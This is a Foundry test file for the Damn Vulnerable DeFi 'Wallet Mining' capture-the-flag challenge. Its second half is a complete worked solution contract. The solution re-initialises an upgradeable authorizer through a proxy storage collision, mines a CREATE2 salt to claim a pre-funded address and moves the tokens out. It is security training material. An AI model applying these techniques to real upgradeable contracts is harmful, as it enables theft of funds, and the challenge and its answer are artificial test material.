// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory,
    AuthorizerUpgradeable,
    TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS)
                .deployCreate2({
                    salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                    initCode: type(AuthorizerFactory).creationCode
                })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) = address(SAFE_SINGLETON_FACTORY_ADDRESS)
            .call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS)
                .deployCreate2({
                    salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                    initCode: bytes.concat(
                        type(WalletDeployer).creationCode,
                        abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                    )
                })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        // Constraints:
        // No on-chain tx from user (nonce stays 0), but off-chain signatures from user are allowed
        // Player can only send 1 transaction

        // Steps to solve Wallet Mining challenge:
        // 1) Deploy ChallengeSolver so all required actions occur within a single player transaction
        // 2) Exploit improper initialization of AuthorizerUpgradeable by calling init() to authorize ChallengeSolver for (usr=this, aim=USER_DEPOSIT_ADDRESS)
        // 3) Construct “plain 1-of-1” safe setup initializer (owners=[user], threshold=1, all optional fields zeroed)
        // 4) Mine saltNonce so that createProxyWithNonce(cpy, initializer, saltNonce) deploys to USER_DEPOSIT_ADDRESS (CREATE2 deployer = cook address, salt derived as keccak256(abi.encodePacked(keccak256(initializer), saltNonce)))
        // 5) Call walletDeployer.drop() to deploy the Safe at the pre-funded address and receive the incentive payout
        // 6) Forward the incentive payout to the ward address to satisfy challenge constraints
        // 7) Use the user’s private key to produce an off-chain signature (no user transaction) and execute a Safe transaction transferring all DVT to the user

        // deploy challenge solver contract to execute necessary operations in one transaction
        new ChallengeSolver(token, authorizer, walletDeployer, proxyFactory, ward, user, userPrivateKey);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

/*//////////////////////////////////////////////////////////////
                            SOLUTION
//////////////////////////////////////////////////////////////*/

import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
// import {Script} from "forge-std/Script.sol";

contract ChallengeSolver is Test {
    error ChallengeSolver__DropFailed();
    error ChallengeSolver__SafeTokenTransferFailed();
    error ChallengeSolver__SaltNotFound();
    error ChallengeSolver__InitNotPossible();

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
    address ward;
    address user;
    uint256 userPrivateKey;
    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;

    constructor(
        DamnValuableToken token_,
        AuthorizerUpgradeable authorizer_,
        WalletDeployer walletDeployer_,
        SafeProxyFactory proxyFactory_,
        address ward_,
        address user_,
        uint256 userPrivateKey_
    ) {
        token = token_;
        authorizer = authorizer_;
        walletDeployer = walletDeployer_;
        proxyFactory = proxyFactory_;
        ward = ward_;
        user = user_;
        userPrivateKey = userPrivateKey_;

        run();
    }

    function run() public {
        // check balance of wallet deployer contract which will be sent to the ward address
        uint256 walletDeployerBalance = token.balanceOf(address(walletDeployer));

        // approve this contract to deploy a safe proxy at the user deposit address
        _authorizeChallengeSolverAsWard();

        // deploy safe proxy as an approved ward to receive deployment reward and rescue funds stuck at user deposit address
        _deploySafeProxyAtUserDepositAddress();

        // transfer tokens received as deployment incentive to ward address for challenge requirement
        token.transfer(ward, walletDeployerBalance);

        // rescue funds from user safe and send to user
        _sendFundsFromSafeToUserWithSafeTransaction();
    }

    // take advantage of improperly initialized AuthorizerUpgradeable contract to call init and authorize ourselves as a ward
    function _authorizeChallengeSolverAsWard() internal {
        // load arrays with this contracts address and USER_DEPOSIT_ADDRESS for init call
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        // check needsInit value and investigate
        console.log("authorizer needsInit: ", authorizer.needsInit()); // needsInit = 209895567101503440808722102436816545213904643469
        // this provides evidence of a storage collision happening between the proxy and the implementation contract both saving variables to slot 0
        // check value actually stored at needsInits location
        bytes32 slot0 = vm.load(address(authorizer), bytes32(uint256(0)));
        console.logBytes32(slot0); // slot0 = 0x00000000000000000000000024c40af179e495d68f60b70a84edeedbd5e4e58d
        // this shows an address is saved to this location on the proxy contract
        // we can see that the TransparentProxy contract has `address public upgrader = msg.sender;` declared as the first state variable that will be stored to slot0
        // this confirms our storage collision suspicion

        // ensure init can still be called. If needsInit = 0 then init is locked
        if (authorizer.needsInit() == 0) {
            revert ChallengeSolver__InitNotPossible();
        }
        // call init to approve this contract as an authorized safe proxy deployer at USER_DEPOSIT_ADDRESS
        authorizer.init(wards, aims);

        // verify init successfully set slot(0) needsInit/upgrader to 0
        console.log("authorizer needsInit after init call: ", authorizer.needsInit());
    }

    // load initialization data, find required saltNonce, deploy safe proxy at desired address, and setup safe on behalf of user
    function _deploySafeProxyAtUserDepositAddress() internal {
        // load initialization data for basic safe deployment on users behalf (owner: user, threshold: 1, other fields: empty)
        // In this deployer, the initializer data affects the salt derivation (hash(initializer), saltNonce), so all initializer fields matter because they change salt which changes the deployed address
        address[] memory owners = new address[](1);
        owners[0] = user;
        uint256 threshold = 1;
        address to = address(0);
        bytes memory data = bytes("");
        address fallbackHandler = address(0);
        address paymentToken = address(0);
        uint256 payment = 0;
        address paymentReceiver = address(0);

        // encode safe setup function call with parameters to pass to WalletDeployer
        bytes memory initializerDataForSafeCreation = abi.encodeWithSelector(
            Safe.setup.selector, owners, threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver
        );

        // mine initial salt nonce needed to get safe proxy deployed at required address by predicting addresses created with different nonces
        uint256 saltNonce = _mineSaltNonce(initializerDataForSafeCreation);
        console.log("Matching Salt Nonce Found: ", saltNonce);

        // challenge solver DVT balance before deploy
        uint256 balanceBefore = token.balanceOf(address(this));

        // deploy safe proxy as an approved ward to receive deployment reward and rescue funds stuck at user deposit address
        // verify deployment succeeded and token reward was received
        if (
            !walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializerDataForSafeCreation, saltNonce)
                || token.balanceOf(address(this)) - balanceBefore != walletDeployer.pay()
        ) {
            revert ChallengeSolver__DropFailed();
        }
    }

    // try multiple saltNonces to find the one needed for challenge solution
    function _mineSaltNonce(bytes memory initializerDataForSafeCreation) internal view returns (uint256) {
        // load state before loop for efficiency
        address predictedAddress;
        address cpy = walletDeployer.cpy();
        address cook = address(walletDeployer.cook());
        bytes memory creationCode = proxyFactory.proxyCreationCode();

        // deploymentData generation process copied directly from SafeProxyFactory
        bytes memory deploymentData = abi.encodePacked(creationCode, uint256(uint160(cpy)));
        // we need to use the keccak256 hash of the deploymentData
        // create2 would typically do this internally but we are simulating the create2 process without actually deploying so we need to add a step not included in SafeProxyFactory
        bytes32 deploymentDataHash = keccak256(deploymentData);

        // loop through possible saltNonces using basic safe proxy deployment values to find which saltNonce gets the proxy to deploy at the desired address
        for (uint256 i = 0; i < 100_000; i++) {
            predictedAddress = _predictDeployedAddress(cook, initializerDataForSafeCreation, i, deploymentDataHash);
            if (predictedAddress == USER_DEPOSIT_ADDRESS) {
                return i;
            }
        }
        revert ChallengeSolver__SaltNotFound();
    }

    // generate proxy deployment address through process that mirrors WalletDeployer flow
    function _predictDeployedAddress(
        address cook,
        bytes memory initializerDataForSafeCreation,
        uint256 saltNonce,
        bytes32 deploymentDataHash
    ) internal pure returns (address predictedAddress) {
        // salt generation process copied directly from SafeProxyFactory
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializerDataForSafeCreation), saltNonce));
        // simulate create2 process to predict the address that would be generated through SafeProxyFactory deployment flow
        // note: cook address is needed since create2 uses the calling address within the hash to generate the final deployment hash and deployment address (cook is the calling address in WalletDeployer flow)
        // if we used create2 to simulate the deployment process here it would wrongly use address(this) instead of cook so it is important we simulate as opposed to directly using create2 for predicting the deployment address
        bytes32 create2DeploymentHash = keccak256(abi.encodePacked(bytes1(0xff), cook, salt, deploymentDataHash));
        // convert the deployment hash generated by the simulated create2 process into the address that the proxy would have been deployed at
        predictedAddress = address(uint160(uint256(create2DeploymentHash)));
    }

    // build, sign, and execute safe transaction using the users private key to recover the DVT from the safe and sends all tokens to the user
    function _sendFundsFromSafeToUserWithSafeTransaction() internal {
        // load transaction data to be used in safe execTransaction call
        bytes memory safeTransactionData = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);

        // get current safe nonce
        uint256 currentNonce = Safe(payable(USER_DEPOSIT_ADDRESS)).nonce();

        // hash safe transaction data to be signed with users private key
        bytes32 safeTransactionDigest = Safe(payable(USER_DEPOSIT_ADDRESS))
            .getTransactionHash(
                address(token), // safeTransactionTo
                0, // value
                safeTransactionData,
                Enum.Operation.Call, // 0 = call, 1 = delegatecall
                0, // safeTxGas
                0, // baseGas
                0, // gasPrice
                address(0), // gasToken
                payable(address(0)), // refundReceiver
                currentNonce
            );

        // sign safe transaction with users private key and pack for verification by the deployed safe
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, safeTransactionDigest);
        bytes memory signatures = abi.encodePacked(r, s, v);

        // execute safe operation on behalf of user to recover funds
        bool success = Safe(payable(USER_DEPOSIT_ADDRESS))
            .execTransaction(
                address(token), // safeTransactionTo
                0, //value
                safeTransactionData,
                Enum.Operation.Call, // 0 = call, 1 = delegatecall
                0, // safeTxGas
                0, // baseGas
                0, // gasPrice
                address(0), // gasToken
                payable(address(0)), // refundReceiver
                signatures
            );
        // verify execution success
        if (!success) {
            revert ChallengeSolver__SafeTokenTransferFailed();
        }
    }
}
